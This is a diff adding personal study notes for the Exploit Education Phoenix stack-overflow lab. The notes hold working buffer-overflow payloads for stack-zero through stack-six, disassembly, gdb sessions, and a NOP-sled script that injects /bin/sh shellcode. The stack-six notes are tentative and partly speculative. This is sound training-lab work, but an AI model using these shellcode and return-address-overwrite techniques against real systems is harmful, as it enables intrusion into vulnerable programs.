@@ -1,0 +1,204 @@
+Setting up:
+https://blog.lamarranet.com/index.php/exploit-education-phoenix-setup/
+
+Follow this guide!
+
+Run script: 
+D:
+cd D:\Downloads\exploit-education-phoenix-amd64-v1.0.0-alpha-3\exploit-education-phoenix-amd64
+powershell.exe -ExecutionPolicy Bypass -File boot-exploit-education-phoenix-amd64.ps1
+
+Putty:
+Connect to 127.0.0.1:2222
+
+
+
+stack-zero:
+user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A' * 100" | ./stack-zero
+
+
+stack-one
+64 'A' + what_you_want_to_change
+Can see from the structure, the int changeme is directly after the char Buffer
+./stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
+
+stack-two
+unset ExploitEducation //need to unset after running stack-two everytime
+export ExploitEducation=$(python -c "print 'A'*64 + '\x0a\x09\x0a\x0d' " )
+./stack-two
+
+stack-three
+gdb ./stack-three
+disass complete_level: 0x000000000040069d
+
+objdump -M intel -d stack-three:
+000000000040069d <complete_level>:
+  40069d:       55                      push   rbp
+  40069e:       48 89 e5                mov    rbp,rsp
+  4006a1:       bf 90 07 40 00          mov    edi,0x400790
+  4006a6:       e8 45 fe ff ff          call   4004f0 <puts@plt>
+  4006ab:       bf 00 00 00 00          mov    edi,0x0
+  4006b0:       e8 5b fe ff ff          call   400510 <exit@plt>
+
+python -c "print 'A' * 64 + '\x9d\x06\x40\x00\x00\x00\x00\x00'" | ./stack-three
+
+stack-four:
+
+000000000040061d <complete_level>
+python -c "print 'A' * 88 + '\x1d\x06\x40\x00\x00\x00\x00\x00'  " | ./stack-four
+
+Difference between stack-three and stack-four is:
+stack-four corrupts the return address
+while stack-three is explictly called.
+
+stack-five:
+no ASLR enabled, rsp is the same even after crash
+
+overwrite rip to 0x7fffffffe610
+shellcode:
+shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+r <<< $(python -c "print '\x41' * 136 + '\x42\x42\x42\x42\x42\x42\x42\x42' + '\x90' * 100 + '\xCC' * 50")
+
+r <<< $(python -c "print '\xCC' * 136 + '\x9a\xe5\xff\xff\xff\x7f' ")
+ 
+although we have space behind the rip, we cannot use that space because the rsp here have null characters!
+and we are unable to write any null characters, so we can only use our buffer. We will do a partial write of
+rip, the rest will be appended to 00s for us!
+
+code: 
+nop_sled1 = "\x90" * 30
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+nop_sled2 = "\x90" * (136 - len(nop_sled1) - len(shellcode))
+rip_control = "\x9a\xe5\xff\xff\xff\x7f"
+
+buf = nop_sled1 + shellcode + nop_sled2 + rip_control
+print buf
+
+python stack5.py > shellcode-raw
+(cat shellcode-raw; cat) | /opt/phoenix/amd64/stack-five
+
+Learning point:
+Too fixated on using the buffer space behind the rip_control
+
+stack-six
+Greet message:
+Welcome, I am pleased to meet you
+
+length = 33
+
+char *what = GREET;
+
+char *greet(char *who) {
+  char buffer[128];
+  int maxSize;	integer overflow??
+
+  maxSize = strlen(who);
+  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
+    maxSize = sizeof(buffer) - 1;
+  }
+
+  strcpy(buffer, what);			//what is "welcoem i am pleace to meet you"
+  strncpy(buffer + strlen(buffer), who, maxSize);
+
+  return strdup(buffer);
+}
+
+   0x00000000004006fd <+0>:     push   rbp
+   0x00000000004006fe <+1>:     mov    rbp,rsp
+   0x0000000000400701 <+4>:     push   rbx
+   0x0000000000400702 <+5>:     sub    rsp,0xa8
+   0x0000000000400709 <+12>:    mov    QWORD PTR [rbp-env_var],rdi		//rdi contains the env_var
+   0x0000000000400710 <+19>:    mov    rax,QWORD PTR [rbp-env_var]
+   0x0000000000400717 <+26>:    mov    rdi,rax
+   0x000000000040071a <+29>:    call   0x400580 <strlen@plt>		//strlen(env_var)
+   0x000000000040071f <+34>:    mov    DWORD PTR [rbp-len(env_var)],eax		//len(env_var) is the result
+   0x0000000000400722 <+37>:    mov    eax,DWORD PTR [rbp-len(env_var)]
+   0x0000000000400725 <+40>:    cmp    eax,0x7f
+   0x0000000000400728 <+43>:    jbe    0x400731 <greet+52>
+   0x000000000040072a <+45>:    mov    DWORD PTR [rbp-len(env_var)],0x7f	//set to maxLen
+   0x0000000000400731 <+52>:    mov    rdx,QWORD PTR [rip+0x200458]        # 0x600b90 <what>
+   0x0000000000400738 <+59>:    lea    rax,[rbp-0xa0]
+   0x000000000040073f <+66>:    mov    rsi,rdx
+   0x0000000000400742 <+69>:    mov    rdi,rax
+   0x0000000000400745 <+72>:    call   0x400510 <strcpy@plt>
+   0x000000000040074a <+77>:    mov    eax,DWORD PTR [rbp-len(env_var)]
+   0x000000000040074d <+80>:    movsxd rbx,eax
+   0x0000000000400750 <+83>:    lea    rax,[rbp-0xa0]
+   0x0000000000400757 <+90>:    mov    rdi,rax
+   0x000000000040075a <+93>:    call   0x400580 <strlen@plt>
+   0x000000000040075f <+98>:    mov    rdx,rax
+   0x0000000000400762 <+101>:   lea    rax,[rbp-0xa0]
+   0x0000000000400769 <+108>:   lea    rcx,[rax+rdx*1]
+   0x000000000040076d <+112>:   mov    rax,QWORD PTR [rbp-env_var]
+   0x0000000000400774 <+119>:   mov    rdx,rbx
+   0x0000000000400777 <+122>:   mov    rsi,rax
+   0x000000000040077a <+125>:   mov    rdi,rcx
+   0x000000000040077d <+128>:   call   0x400550 <strncpy@plt>
+   0x0000000000400782 <+133>:   lea    rax,[rbp-0xa0]
+   0x0000000000400789 <+140>:   mov    rdi,rax
+   0x000000000040078c <+143>:   call   0x400560 <strdup@plt>
+   0x0000000000400791 <+148>:   add    rsp,0xa8
+   0x0000000000400798 <+155>:   pop    rbx
+   0x0000000000400799 <+156>:   pop    rbp
+   0x000000000040079a <+157>:   ret
+
+
+The number 2,147,483,647 (or hexadecimal 7FFFFFFF16) is the maximum positive value for a 32-bit signed binary integer in computing
+integer overflow??
+
+with A*110 -->
+i am leaking address of the first argument???
+
+corrupted rbx???
+actual return address: 0x00007ffff7d8fd62
+overwritten my rsp for the final return
+
+initial RBP: 0x00007fffffffe600
+overwritten one bit of the rbp!!
+$rbp   : 0x00007fffffffe641  →  0xa600000000000000
+
+$rsp   : 0x00007fffffffe5d0  →  0x00007fffffffe600  →  0x0000000000000001
+$rbp   : 0x00007fffffffe5d0  →  0x00007fffffffe600  →  0x0000000000000001
+
+export foo=$'\x90\x90\x90\xCC'
+export ExploitEducation=$(python -c "print 'C'*125 + 'A'*5 " )
+
+my buffer is at 
+0x00007ffff7ffc948
+
+Something i can control here ------------------->
+0x7fffffffe548: 0x00000001      0x00000000      0x41414141      0x41414141
+
+125 'junk' + 5 \x48
+export ExploitEducation=$'\x42\x43\x41\x41\x41\x41\x44\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x44\x45\x46\x48\x48\x48\x48\x48'
+
+\x41\x41\x41\x42\x41\x41\x41\x43\x41\x41\x41\x44\x41\x41\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x41\x47\x41\x41\x41\x48\x41\x41\x41\x49\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x53\x41\x41\x41\x41\x41\x41\x41\x41\x41\x52\x41\x41\x41\x41\x41\x41\x51\x41\x41\x41\x41\x41\x41\x41\x41\x48\x48\x48\x49
+unset ExploitEducation
+
+Workable outside gdb:
+export ExploitEducation=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xD0\xD0\xD0\xD0'
+
+Important gdb commands!!! Unset the values and set the stack
+gdb /opt/phoenix/amd64/stack-six
+unset env LINES
+unset env COLUMNS
+set env _ /opt/phoenix/amd64/stack-six
+break *0x000000000040077d
+r
+when run exploit:
+/opt/phoenix/amd64/stack-six
+
+debugging commands (copy-paste):
+unset ExploitEducation
+export ExploitEducation=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xD0\xD0\xD0\xD0'
+gdb /opt/phoenix/amd64/stack-six
+unset env LINES
+unset env COLUMNS
+set env _ /opt/phoenix/amd64/stack-six
+break *0x000000000040077d
+break greet 
+r
+
+
+
